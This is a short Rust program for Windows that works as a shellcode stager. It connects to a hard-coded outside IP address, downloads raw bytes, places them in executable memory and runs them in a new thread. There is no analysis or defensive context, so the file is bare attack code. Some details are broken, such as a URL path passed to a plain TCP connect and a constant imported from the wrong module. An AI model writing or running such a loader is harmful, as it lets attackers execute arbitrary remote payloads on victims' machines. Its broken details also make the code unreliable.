use std::net::TcpStream;
use std::io::Read;
use winapi::um::memoryapi::{VirtualAlloc, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE};
use winapi::um::winnt::PAGE_EXECUTE_READWRITE as EXEC_RW;
use winapi::um::processthreadsapi::CreateThread;
use winapi::um::synchapi::WaitForSingleObject;
use winapi::um::winbase::INFINITE;

fn main() {
    let mut stream = TcpStream::connect("157.245.3.180:8000/shellcode").unwrap();
    let mut shellcode = Vec::new();
    stream.read_to_end(&mut shellcode).unwrap();

    let exec_mem = unsafe {
        VirtualAlloc(
            std::ptr::null(),
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        )
    };

    unsafe {
        std::ptr::copy(shellcode.as_ptr(), exec_mem as *mut u8, shellcode.len());
    }

    let thread = unsafe {
        CreateThread(
            std::ptr::null_mut(),
            0,
            Some(std::mem::transmute(exec_mem)),
            std::ptr::null_mut(),
            0,
            std::ptr::null_mut(),
        )
    };

    unsafe { WaitForSingleObject(thread, INFINITE); }
}
